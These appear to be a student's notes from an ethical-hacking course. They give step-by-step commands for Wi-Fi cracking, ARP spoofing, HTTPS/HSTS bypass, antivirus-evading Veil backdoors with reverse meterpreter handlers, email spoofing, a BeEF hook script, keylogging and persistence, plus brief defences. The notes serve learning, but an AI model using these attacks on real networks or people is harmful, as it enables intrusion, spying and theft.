Ethical Hacking

Link https://www.udemy.com/learn-ethical-hacking-from-scratch

# SUMMARY

1. Setup lab: Kali, network interface, monitor mode

2. Access Phase - Gaining access to WIFI network
    1. WEP
        * busy network
                              
                airodump-ng (capture a large number of packets and related IVs that are sent with the data)
                aircrack-ng (analyze capture IVS)

        * idle network
            1. Force the router to generate new IVs via Fake Authentication

                aireplay-ng --fakeauth

            2. Use an ARP request replay attack to generate new IVs

                aireplay-ng --arpreplay

    2. WPA (stronger encryption)
        1. Use misconfigured WPS functionality

        2. Crack encryption via handshake: capture handshake, wordlist attack that generate handshake from a list of word and compare each of them to real handshakes

                aircrack-ng

3. Exploit phase - Post-connection attacks
    1. Info gathering: ifconfig / netdiscover / nmap
    2. MITM attacks
        1. ARP Spoofing / Poisoning: meddle with ARP tables to trick access point and target that they are the target/access point
            1. use arpspoof

            2. use MITMf (no longer maintained) that allows to ARP spoof, sniff data, bypass HTTPS, DNS spoofing, inject code, capture screen ...
            
            3. use bettercap (current solution) that allows to ARP spoof, sniff data, bypass HTTPS/HSTS, DNS spoofing, inject code, capture screen ...
        
        2. Fake Access Point
    3. Server-side attacks: need to be MITM + hack devices via vulnerabilities
        1. exploit misconfiguration: zenmap to get info on running programs and ports

        2. exploit backdoors
            1. metasploit (framework) to carry out penetration testing (port scans, ...)

                                        msfconsole -> use -> set -> exploit

            2. Nexpose (framework)
        
        3. exploit code execution vulnerabilities: same as before + payload
        
        4. Client-side attacks
            1. Via File
                * Create undetectable backdoor: use Veil-evasion to create backdoor with meterpreter and reverse connection payload. Check way to migrate to more stable process and run backdoor as a service to maintain connection even after restart
                * Backdoor file that user will want: Au2Exe to generate script and right-to-left trick to backdoor any type of file
                * Deliver backdoored file
                    1. Backdoor on the fly with BDFPROXY and MITM attack -> not really a client side attack as we need to be MITM
                    2. Social engineering to impersonate contact and trick user to get a file and download backdoor
                        * Maltego (Information Gathering Tool) to gather info
                        * Spoof email via sendemail and sendgrid SMTP service
            2. Via URL: BeEF (Framework) launch attacks on a hooked target via URL

4. Post exploitation
    1. meterpreter to control target
    2. pivoting: using target to gain access to other devices => use Autoroute module from

5. Website hacking                                        

# List of programs

* airodump-ng: get info on network, connected devices, capture packets
* aircrack-ng: crack WEP password, crack WPA password via wordlist attack
* aireplay-ng: fake authentication attack (--fakeauth), ARP request replay attack (--arpreplay)
* netdiscover: map connected devices
* nmap: map connected devices
* arpspoof: simple arpspoof attack
* MITMf (no longer maintained): framework that allows to ARP spoof, sniff data, bypass HTTPS, DNS spoofing, inject code, capture screen ...
* bettercap (current solution): framework that allows to ARP spoof, sniff data, bypass HTTPS/HSTS, DNS spoofing, inject code, capture screen ...
* zenmap: get info on running programs and ports
* metasploit: framework to carry out penetration testing (port scans ) + GUI via Metasploit Community
        * Autoroute: metasploit module that allows pivoting
        * meterpreter: payload used to control target
* Nexpose: similar to metasploit but list more vulnerabilities
* Veil: framework used here for Evasion tool that allows to create backdoor with meterpreter and reverse connexion payload
* Maltego: information gathering tool used in social engineering attacks
* BeEF: framework that allows to launch attacks on a hooked target. A target is hooked when it loads a URL containing custom script
* Xarp: allows to monitor ARP tables and detect ARP spoofing attacks

# Lexicon

* ARP: Address Resolution Protocol used to map IP with MAC addresses on a network (not very secure)
* IV (Initialization Vector): used to generate key to encrypt data that is sent via WEP protocol
* handshake: 4 packets sent when a client connects to an access point
* backdoor: file that gives us full control over the machine that it gets executed on
* Trojan: 2 parts -> file that the user want and backdoor
* Pivoting: using a device as a pivot in ordered to attack and other device that is not readily visible to the hacker (on different network)

# Protection against attacks

* MITM:
    * detecting: Xarp / manually check ARP table (arp -a) / Wireshark
    * preventing: change ARP entry for the router from dynamic to static
* backdoor: only download from HTTPS + check file MD5 after download
* detecting trojans: check properties of a file / run the file on a virtual machine and check resources / use hybrid-analysis.com sandbox service

# Setup Lab

## Install Kali

- Download Virtualbox
- Download Kali prebuild image https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/ (ova extension)
- Download Virtualbox Extension Pack (for USB support)
- Don't forget to enable Virtualization in BIOS
- Import Kali machine in Virtualbox
- Settings: 1 GB of RAM is enough, 1 CPU is enough, Network use NAT Network (create a virtual ethernet network where host is router for virtual machine)
** sometimes you don't see a network name, you have to create it: VirtualBox > Preferences > Network > Click + sign
- Connect to Kali (root / toor)
- Take a snapshot: Tools > Snapshots > Take > Name / Description // Convenient if you mess something up or if you need to downgrade a library for example

## Virtual Machine to attack

* Windows virtual machine
* Metasploitable: vulnerable linux distro to test server attack, use the existing virtual disk downloaded (user and password msfadmin)

## How a network works

* Clients connect to the network to access a resource (ex internet)
* Network has a device that is a server (ie router/access point). It is the only device that have access to the ressource. All clients need to connect to the access point to access the resource
* The data is transfered as PACKETS (Request / Responses)

## Connect Wifi adapter to Kali

* Even if you can, wifi card usually don't allow MONITOR MODE and PACKET INJECTION (that you need)
* Click the machine > Settings > Ports > USB > Enable USB > Choose USB options > Add Device
** If device is not shown: In terminal type sudo adduser $USER vboxusers > Log out and in > plus USB and restart VirtualBox, it should work
* Connect USB after Kali is loaded, check in Devices if USB adapter is checked, then type ifconfig to check if connected
* In the example, we have Internet connection through the NAT network and use the USB Wifi adapter for attacks

## Changing MAC Address

* MAC
    * Media Access Control = permanent physical and unique address assigned to network interfaces by the device manufacturer
    * It is used to identify devices within a network, a packet has a source MAC and a destination MAC to know where it comes from and where it goes
    * as soon as packets pass through access point, individual MACs are changed into Access Point MAC (so it is not possible to straighforward trace an individual MAC address on internet)
    * It is important to change the MAC address to increase anonymity, impersonate other devices, and bypass filters
* To change the MAC address:
            
            ifconfig
            ether is the MAC address of the virtual interface
            wlan0
    
    * disable the interface:
            
            ifconfig wlan0 down
            ifconfig wlan0 hw ether 00:11:22:33:44:55
            ifconfig wlan0 up
    
    * We only changing in memory so when the computer is restarted, MAC address come back to original

## Wireless Modes - Be able to get all packets even if we don't have the WEP key

* By default, a device only receives packets that have its MAC address in the Destination MAC
* But in wireless mode, we can capture them anyway: change the mode to MONITOR MODE
    * Managed: default mode, only capture packets that has its MAC address as destination MAC
            
            iwconfig to check Mode
            ifconfig wlan0 down
            airmon-ng check kill (kill all processes that use the interface)
            iwconfig wlan0 mode monitor
            ifconfig wlan0 up

NOTE: in case you don't see any wireless or wifi connexions

        service NetworkManager start

NOTE 2: If networks don't show up but interface is detected, try to put USB mode to USB3 in Virtualbox settings

* Another method:

        ifconfig wlan0 down
        airmon-ng check kill
        airmon-ng start wlan0
        iwconfig

# Preconnection Attacks (even before connecting to anything)

* gain info on the network we want to target

        airodump-ng

## Packet sniffing - using airodump-ng

* discover all networks around me with detailed info

        airodump-ng wlan0

    * BSSID: MAC ADDRESS of the target network (the router)
    * PWR: the power of the network (higher number)
    * Beacons: frames sent by the network to broadcast its existence (even if it's hidden)
    * #Data: the number of data frames / packet
    * #/s: the number of packets that we intercept in the past 10 seconds
    * CH: The channel the network works on
    * MB: Maximum speed supported by the network
    * ENC: The encryption method used by the method
    * CIPHER: Cipher used in the network (CCMP / WEP)
    * AUTH: authentification used on that network (PSK - Pre Shared Key, MGT)
    * ESSID: Name of the networks

## Wifi Bands:

* Decides the frequency range that can be used
* Determines the channel that can be used
* Clients need to support band used by the router to communicate with it
* 2.4GhZ / 5GhZ bands => you can only sniff on the band that your interface supports.
* If you don't see a network or a client it might be because it broadcasts on 5Ghz and the adapter only supports 2.4 GHz
* airmon-ng wlan0 => sniff on 2.4GHz band by default
* airmon-ng --band a wlan0 => sniff on 5GHz band
* airmon-ng --band abg wlan0 => sniff on 2.4 and 5GHz bands, it will be slower than sniffing on only one band

## Sniff only a specific network

* Tell airodump to only sniff one network on a specific channel and to write result in a file named test. It will show the info of the network as before + list of devices connected

        airodump-ng --bssid A4:3E:51:3A:DC:35 --channel 1 --write test wlan0

    * BSSID: MAC address of the network
    * STATION: MAC address of the device
    * PWR: Signal strength
    * Rate: The speed
    * Lost: Amount of data lost
    * Frames: number of frames captured
    * Probe: check if the device is still probing for network (not connected but you still see it)
* The .cap file contains all data that has been sniffed, but will be encrypted with the ENC method
* You can use wireshark to open the data, but the only info we will have is the device manufacturer (sometimes)

## Deauthentication Attack - airplane-ng

* Disconnect any client from any network even if we don't have the encryption key
* we pretend to be the client that we want to disconnect (by spoofing its MAC address) and we send a disconnect packet to the router, and then we impersonate the router and send a deauthentication packet to the client.

        aireplay-ng --deauth <big number so client keeps being disconnect for a long time> -a <BSSID of network> -c <BSSID of client> wlan0

* airdrop-ng is a script that carries out the previous attack automatically based on specific rules.

        airodump-ng --write file --output-format csv wlan0

        airdrop-ng -t file-01.csv -r rules -i mon0 (rules refer to rules.txt with rules)

# Gaining Access (cracking wifi keys)

## WEP - Wired Equivalent Privacy

### Busy network - airodump-ng + aircrack-ng

* Old encryption easily broken, using the RC4 encryption algorithm
* Client encrypts data using a key => packets sent => router decrypts packet using the key
    * Each packet is encrypted using a unique key stream
    * Random 24bit initialization vector (IV) is used to generate the keys streams (weak)
    * IV + Key = Key stream => key stream + data to send to the router => ASDKASKJDF
    * The IV is sent with the encrypted data so the Access Point can decrypt the data
* Weaknesses
    * IV is sent in plain text
    * Size of IV is small. IV will be repeated in a busy network, this makes WEP vulnerable to statistical attacks, repeated IV can be used to determine the key stream and break the encryption
* To crack WEP, we need:
    * to capture a large number of packets/IVs
    
            airodump-ng --bssid xxx -channel x --write file wlan0
    
    * Analyse the captured IVs and crack the key
    
            aircrack-ng file.cap (and it will display the key, juste remove the semi columns to use it)

### Idle network

* Force the AP to generate new IVs via Fake Authentification
1. To associate with the network we use aireplay-ng

        aireplay-ng --fakeauth 0 -a <MAC address of the target AP> -h <MAC Adress of the wireless, shown as the 12 first digits via iwconfig> wlan0

    * If authentication is successful, the MAC address of the wireless should appear in the airodump-ng list

2. Use an ARP request replay attack to generate new IVs
* We wait for an ARP packet to be generated
* We capture it and we replay it
* This causes the AP to produce another packet with a new IV

        aireplay-ng --arpreplay -b 68:A3:78:83:F1:FB -h 00-11-22-33-44-66 wlan0

* As soon as an ARP packet is caught, it is replayed and then increased the traffic. We can then use the same aircrack-ng command as before

## WPA / WPA 2 - Wired Equivalent Privacy

* Only difference between the two are the encryption used, but same methods are used

### Use WPS feature if misconfigured

* Allow clients to connect without the password
* Authentication is done using an 8 digit pin, all combinations can be easily tried in a short period of time, and then WPS pin can be used to compute the actual password
* Only works if the router is configured not to use Push Button Authentication but the Pin Authentication

        wash --interface wlan0
        => display all networks that have WPS enabled

* Lck tells us if the WPS is locked after a certain number of attempts

1. Start in a terminal, reaver that will actually try PIN combination to crack the WPA based

### Crack the actual WPA encryption - capture handshake

* The only packets that can aid with the cracking process are the handshake packets, 4 packets sent when a client connects to the network

1. Capture the handshake

    * Display network info via airodump-ng against the targeted network
    * Use the deauth attack with 4 as time to attack to disconnect and reconnect a client
    * in airodump-ng at the top should appear the message "WPA handshake" which means that we captured an handshake

2. Creating a wordlist

* The handshake does not contain any information that can help to crack the encryption
* You use a wordlist to try password with the handshake

    * Create own wordlist

            crunch [min] [max] [characters] -t [pattern] -o [Filename]

    * Use a list from the Internet

            ftp://ftp.openwall.com/pub/wordlists/
            http://www.openwall.com/mirrors/
            https://github.com/danielmiessler/SecLists
            http://www.outpost9.com/files/WordLists.html
            http://www.vulnerabilityassessment.co.uk/passwords.htm
            http://packetstormsecurity.org/Crackers/wordlists/
            http://www.ai.uga.edu/ftplib/natural-language/moby/
            http://www.cotse.com/tools/wordlists1.htm
            http://www.cotse.com/tools/wordlists2.htm
            http://wordlist.sourceforge.net/

3. Using a Wordlist attack

    * ng will unpack the handshake and extract the MIC (Message Integrity Code) and othe infos (SP Address, STA address, AP Nonce, STA Nonce, EAPOL, Payload)
    * It will use the other infos and combine with each word from our list to generate an MIC, if it's the same as the one in the handshake, you found the password

            aircrack-ng <name of the file containing handshake>.cap -w test.txt
    
    * appart from social engineering (evil twin attack) it is the only method to crack a WPA code

# Post-connection Attacks

## Information Gathering on devices connected to the network

* display all connected devices on the network where the machine is connected to (specify a range of ip to look for - from 10.0.2.1 to 10.0.2.254)

        ifconfig => to get machine IP on the network
        netdiscover -r 10.0.2.1/24

* NOTE: you may have to disconnect NAT network in order to use netdiscover on wifi adapter

* Use nmap / zenmap (graphical interface) to get more information on an IP range: open ports, running services, OS, Connected clients ...

        nmap -v -sn 192.168.0.1/24

* NOTE: if nothing shows (all hosts are down) try to run nmap with -Pn (option not to perform host discovery). If you see that all ports are filtered it means that firewall is filtering everything.

## MITM (Man in the Middle) Attacks

* intercept connexion between victim and resources (internet). Different methods exists:
        * ARP SPOOFFING ATTACKS: redirect flow of packets so it flows through attacker computers
        * FAKE ACCESS POINT (Honeypot)

## ARP SPOOFING ATTACKS - ARP POISONNING

### ARP: Address Resolution Protocol
        * Not very secure
        * Simple protocol used to map IP address to a machine via its MAC address
        * To communicate to as specific computer connected to a network
                1. The emiter broadcast to all devices an ARP REQUEST asking "Who has 10.0.2.6 IP address ?"
                2. The device with the target IP will send an ARP RESPONSE saying "I have xxx IP and my MAC address is xxx"
                3. The emiter will have the MAC address of the device and use it to communicate with it
        * Each computer have an IP table which links IP addresses on the same network to their MAC addresses
        * To see an IP table type

                        arp -a

### Generalities

* We send an ARP response to the router that said that I am the targeted device and another ARP response to the targeted computer saying that you are the router
* This way we change the MAC address in the IP tables of the router and the targeted device in order to associate IPs with our MAC address
* Anytime the victim send a request it goes through my computer than forward it to the router and vice versa for the response
* IT IS POSSIBLE BECAUSE:
        * Clients accept responses even if the did not send a request
        * Clients trust response without any form of verification
* For https website, usually mitmf is not able to inject JS. There is an advance method that necessitates to code (Python)

### Use arpspoof to become Man In The Middle

* Need to launch both ways so to spoof router and victim

        arpspoof -i <interface> )t <clientIP / gateway IP> <gateway IP / client IP>

* Need to enable port forwarding (routing) on attacker machine, by default deactivated (security feature of Linux)

        echo 1 > /proc/sys/net/ipv4/ip_forward

### Use MITMf

* Framework to run MITM attacks
* Can be used to:
        * ARP spoof targets (redirect the flow of packets)
        * Sniff data (urls, username, passwords)
        * Bypass HTTPS
        * Redirect domain requests (DNS spoofing)
        * Inject code in loaded pages
        * ...

                mitmf --arp --spoof -i <interface> --target <clientIP> --gateway <gatewayIP>

* The tool starts automatically a sniffer, that catches data that it is send by the devices. Try with vulnweb.com
* NOTE: might need to deinstall and reinstall older version of Twisted library

### Bypass HTTPS -> check version with bettercap (simpler)

* Previous attack only work agains HTTP requests, because data in HTTP is sent as plain text. MITM can thus read and edit requests and responses
* HTTPS encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer), very difficult to break
* Easiest solution is to downgrade HTTPS to HTTP, ie present the HTTP version of a website instead of the HTTPS version.
* Use SSLstrip, automatically loaded with mitmf
* NOTE: you need to lauch arpspoof and port forwarding alongside mitmf in order to be able to downgrade traffic
* Exception: website that use HSTS
        * HTTP Strict Transport Security
        * Used by Google, Facebook, Paypal ...
        * Modern browsers are hard-coded to only load a list of HSTS websites over https => no practical method to bypass at the moment (see below however :-) 

### DNS spoofing -> check version with bettercap (simpler)

* DNS (Domain Name System) is a server that translates domain names to IP addresses
* As a Man in The Middle we can run a DNS server on our computer and redirect a user to another website

        //start apache server
        service apache2 start
        
        //edit DNS
        leafpad /etc/mitmf/mitmf.conf

        //for example, this will redirect all *.live.com address to the current computer

        [[[A]]]     # Queries for IPv4 address records
		*.thesprawl.org=192.168.178.27
		*.live.com=10.0.2.15

        //launch mitmf with dns option

        mitmf --arp --spoof -i eth0 --target 10.0.2.4 --gateway 10.0.2.1 --dns

### Capturing screen of target and inject keylogger -> check version with bettercap (simpler)

        mitmf --arp --spoof -i eth0 --target 10.0.2.4 --gateway 10.0.2.1 --screen

### Injecting custom JS or HTML code -> check version with bettercap (simpler)

        mitmf --arp --spoof -i eth0 --target 10.0.2.4 --gateway 10.0.2.1 --inject

* Code can be:
        * stored in a file --js-file or --html-file
        * stored online --js-url or --html-url
        * supplied through command line --js-payload or --html-payload

## Using mitmf against real network

* use the same way as before
* Check if Kali machine is only connected with one interface (disconnect ethernet interface)

## Wireshark and use with mitmf -> check version with bettercap (simpler)

* Wireshark is a network protocol analyser
* Designed to help network admin to keep track of what is happening in their network
* It logs packets that flow through the selected interface and analyse all packets
* It the case of a MITM attack, it only sniff packet that go through the attacker computer, not the network or the targeted machine itself

### Analyse packets -> check version with bettercap (simpler)

* open file or click on interface to listen to packet
* type "http" to filter http packets
* to get form data, filter with http and look for POST request and then HTTP form info
* Filter packet content via Edit > Find Packet > Packet Details > String
* Filter cookies via http.cookie, then use the cookie info to log in

### Use Bettercap for MITM attacks -> much easier

* Bettercap is a framework to run network attacks, can be used to ARP Spoof targets (redirect flow of packets), Sniff Data (url, username, passwords), bypass HTTPS, redirect domain request (DNS spoofing), inject code in loaded pages

                bettercap -iface <interface>
                net.probe on => start net.probe module
                net.recon on

* First step: ARP Spoofing:

                bettercap -iface <interface>
                net.probe on
                net.recon on
                set arp.spoof.fullduplex true
                set arp.spoof.targets <IP target>
                arp.spoof on

* Second step: Spying on network devices

                net.sniff on

* Custom script -> caplet file .cap

                net.probe on
                net.recon on
                set arp.spoof.fullduplex true
                set arp.spoof.targets <IP target>
                arp.spoof on
                net.sniff on

                bettercap -iface <interface> -caplet <file.cap>

* Bypass HTTPS with bettercap => use built-in caplet with modified version from udemy teacher + add "set net.sniff.local true" so the HTTPS bypass work (data will be seen as sent from our computer)

                bettercap -iface <interface> -caplet /root/spoof.cap
                caplets.show
                hstshijack/hstshijack => launch the caplet within bettercap

* Bypass HSTS: trick the browser into loading a different website => replace all links for HSTS websites with similar links, ex: facebook.com => facebook.corn
        * same as above, the modified hstshijack code already contains code to modify website as said earlier
        * hstshijack.cap => targets / replacement / dns spoof domains
        * Strategy works only if the user goes to search engine (that do not use HSTS but HTTPS) to search for facebook.com and we modify all links to facebook.corn, then the connection is downgraded to HTTP

* Using a graphical GUI

                bettercap -iface <interface>
                set ui.basepath /usr/share/bettercap
                ui update
                http-ui (user/pass)

## FAKE ACCESS POINT

* Fake access point need to have to interface, the upstream one to connect to the internet (via eth0 for example) and the downsteam one that supports AP mode
* You can set up manually the fake access point (advanced) or you can use the Mana-Toolkit
        * it runs rogue access point attacks
        * Can automatically configure and create fake AP
        * Can automatically sniff data
        * Can automatically bypass https
* 3 main start scripts
        * start-noupstream.sh => stars fake AP with no internet access
        * start-nat-simple.sh => starts fake AP with internet access
        * start-nat-full.sh => starts fake AP with internet access and automatically stars sniffing data, bypass https

* broadcast interface needs to be in Managed mode and not connected to any network
* install mana-toolkit and edit /etc/mana-toolkit/hostapd-mana.conf if needed (SSID, channel ...) 
* edit the sh script leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh

## Detecting ARP Poisoning/Spoofing attacks

* First solution: Check ARP table on victim computer, not very handy
* Second solution: Use Xarp => automatically monitor ARP tables
* Third solution: Use Wireshark: Go to Preferences > ARP > Detect ARP request storms

## Preventing ARP poisoning attacks

* Change the type of ARP entry for the router from dynamic to static, which forbid ARP poisoning => manual

# Gaining Access to any devices

* 2 main approaches:
        * Server side
                * Do not require user interaction, all we need is a target IP
                * Start with info gathering, find open ports, OS, installed services and work from there
                * Very simple to get IP if target is on the same network (netdiscover or zenmap) otherwise a simple ping will give IP
                * Tricky if target is a personal computer accessing network through router, client side attacks or reverse connection more effective
        * Client side
                * Require user interaction, such as opening a file, a link
                * Info gathering is key here, create a trojan, use social engineering to get the target to run it

## Server Side Attacks -> use mitm position to hack data flow via vulnerabilities

* try default password (ssh iPad case)
* Services might be misconfigured such as the r service, ports 512, 513, 514
* Some might even contain a back door
* Code execution vulnerabilities

### Exploit misconfiguration

* Use zenmap on target IP to get information on running programs and vulnerabilities => Google any programs to see if they have vulnerabilities or known exploits
* Example: rsh-client to connect remotely via root with misconfigured authorization

### Exploit backdoors

* metasploit framework: exploit development and execution tool, can be used to carry out penetration testing (port scans, service ID, post exploitation tasks)

                msfconsole - (runs metasploit console)
                use [something] - something can be exploits, payloads, auxiliaries, options
                show [something]
                set [option] [value]
                exploit - runs the current task

### Exploit Code Execution Vulnerabilities

* Same as before, you have to specify payload

### Use Metasploit Community for ease of use

* GUI that discover open ports and installed services (such as zenmap) and maps these services to metasploit modules and exploits and allow us to run these modules from the web GUI

### Use Nexpose as an alternative

* Vulnerability management framework that allows us to discover, assess, and act on discovered vulnerabilities.
* Differencies are metasploit only show exploits that can be used within metasploit where nexpose works on a larger scale + nexpose writes a report at the end
* Steps to be done to use Nexpose

                systemctl nexposeconsole.service disable
                service postgresql stop
                cd /opt/rapid7/nexpose/nsc
                ./nsc.sh

# Client Side Attacks -> deliver and use a backdoor

* Use if server side attacks fails
* If IP is probably useless (different network, hidden behind a router, ...)
* Require user interaction
* Social engineering can be very useful
* Information gathering is vital

## Use Vell - to generate an undetectable (by antivirus) backdoor

* Backdoor = file that gives us full control over the machine that it gets executed on
* https://github.com/Veil-Framework/Veil
* 2 tools:
        * Evasion: tool that generates backdoor (primary tool) => use Evasion
        * Ordnance: tool that generates payload (secondary tool)
* Different type of payload
        * meterpreter: allow to migrate between system process so we can have the payload/backdoor running from a normal process like Explorer => very hard to detect and does not leave a lot of footprints
        * reverse connection: allows to bypass firewall by asking the target computer to connect to the attacker computer

### Generating an undetectable backdoor

        ./Veil.py
        update
        use Evasion
        use 15
        set LHOST <attacker IP>
        set LPORT 8080
        set PROCESSORS 1 => to bypass antivirus more thoroughly
        set SLEEP 6 => idem
        generate

* Check if backdoor is detected by antivirus => https://nodistribute.com

### Open port on attacker for reverse payload to work

* We use metasploit to listen to incoming connection (same people coded metasploit and Veil)
        
        msfconsole
        use exploit/multi/handler => module that listen to connection
        show options
        set payload windows/meterpreter/reverse_https => should correspond with the payload used in the backdoor
        set LHOST 10.0.2.15
        set LPORT 8080
        exploit

### Deliver the backdoor

* Basic method: put the backdoor on a server and download it in the target computer (not effective, only for test)
        * Put file from /var/lib/veil/output/compiled in /var/www/html/custom_folder
        * Start service with service apache2 start
* Using a fake update - Require DNS spoofing + Evilgrade (a server to serve the update)

                //Download and install Evilgrade to have a server for the backdoor
                ./evilgrade => start Evilgrade
                show modules
                configure dap => Download Accelerator Plus
                set agent /var/www/html/payload.exe => set backdoor location
                set endsite www.speedbit.com
                start => start server

                //Start dns spoofing
                Use bettercap method for ease of use
                
                //Start handler
                See above

* Backdooring downloads on the fly via BDFPROXY- backdoor any exe that the target downloads

                //Download, configure and start bdfproxy
                Install bdfproxy
                leafpad /etc/bdfproxy/bdfproxy.cfg
                => set IP address and proxyMode to transparent
                bdfproxy => start program
                
                //Rediret traffic to bdfproxy
                iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080

                //Start arp spoofing
                mitmf --arp --spoof-i <interface> --gateway <gateway IP> --targets <target IP>
                or bettercap

                //Start listening for connections
                msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc

                // When done reset ip table rules

### Protect yourself

* Ensure you're not being MITM'ed => trusted networks only, use xarp
* Only download from HTTPS
* Check file MD5 after download => www.winmd5.com

## Client side attacks - Social Engineering

* Main problem with server side attacks => we need to be the man in the middle
* Client side attacks start with gathering infos about the user and then build a strategy and a backdoor based on the info
* The strategy can be to impersonate a friend and send a request via mail or other means to open a file

### Maltego

* Maltego is an information gathering tool that can be used to collect info about ANYTHING (website, company, person, ...).
* Discover entities associated with target
* Display info on a graph
* You can via Transform:
        * Discovering websites,Links and social networking accounts associated with target
        * Discovering Twitter friends & Associated accounts
        * Discovering Emails of the target's friends
        * Analyzing the Gathered Info & Building an attack strategy

### Backdooring any file type (images, pdfs, ...)

* Custom Au2Exe script, see udemy for source code
* Compile the script => .txt => .au3
* Changing Trojan's icon
* Spoof .exe extension => use a right to left character + add to archive to overpass browser protection
* Start handler (see above)

### Delivery - Spoofing emails

* setting up an SMTP server to bypass mailbox security => SendGrid
* Sending emails as any email account
                
                sendemail -s smtp.sengrind.net:25 -xu <user> -xp <password> -f "m.asker@isecurity.org" -t "zaid@isecurity.org" -u <subject> -m <message body with link> -o message-header="From:<name>"

### BeEF

* Browser Exploitation Framework allows us to launch a number of attacks on a hooked target.
* A target is hooked once they load a hook URL (actually a script need to be launched), several method to deliver the URL
        * DNS spoof requests to a page containing the hook
        * Inject the hook in browsed pages (need to be MITM)
        * Use XSS exploit
        * Social engineer the target to open a hook page

* Script to hook any page

                var imported = document.createElement('script);
                imported.src = 'http://YourIp:3000/hook.js';
                document.head.appendChild(imported);

* Running basic commands on target: alert box, raw javascript, screenshot, webcam, redirect ...
* Stealing credentials/ passwords using a fake login prompt (with proper CSS)
* Gaining full control over windows target: notification bar

### Detecting Trojans manually

* Trojans / backdoors have two parts: the first runs in the background and run the code (open a port, give us a connection ...), the second runs a code that the user expect (play an MP3, download a file, ...)
* To detect a Trojan:
        * Check properties of the file
        * Run the file in a virtual machine and check resources
        * Use an online sandbox service: https://www.hybrid-analysis.com

## Gaining access outside the local network

* Need to configure router to allow incoming connection and redirect them to the Kali machine
=> see Udemy lectures fo details

# Post-Exploitation

## Meterpreter

                background => "minimize" the session while maintening connection
                sessions -l => list all sessions
                sessions -i <id> => connect to the session
                sysinfo => get info on system
                ipconfig => list internet interfaces
                ps => list all processes
                migrate <id of process> => move our current session to another program (that is less likely to be terminated, be careful of the port used 8080 that will show in the Resource Manager)

* File System Commands are linux commands (pwd, ls, cat, ...) + download / upload / execute

## Maintaining Access

* in case the target person uninstal the vulnerable program or if they restart their computer
1 Migrate the backdoor to a more "stable" process (explorer, browser)
2 Using a veil-evasion (use it instead of a normal backdoor or uplad and execute from meterpreter) -> does not always work
3 Using persistence module -> detectable by antivirus program
4 Using metasploit + veil-evasion -> more robust + undetectable by antivirus / use normal backdoor and run as a service

                use exploit/windows/local/persistence
                set session <session id>
                set exe::custom <backdoor location>
                exploit

## Spying (keylogger)

* in meterpreter => keyscan_start / keyscan_dump (show data) / keyscan_stop

## Pivoting

* Use the hacked device as a pivot to gain access to other devices in the network, that are not readily visible to the hacker
* Use Autoroute
        * Setup a route between hacker and hacked device
        * Gives hacker access to devices on the network
        * Use metasploit

                        use post/windows/manage/autoroute
                        set SUBNET <subnet> => the other subnet used by the pivot
                        set SESSION <id> => link with the session used to connect to the pivot
                        exploit

        * Then able to run any exploit

# Website Hacking

## Information Gathering

## File Upload, Code Execution, File Inclusion Vulns

## SQL Injection Vulnerabilities

## Cross Site Scripting Vulnerabilities

## Discovering Vulnerabilities automatically using OWASP ZAP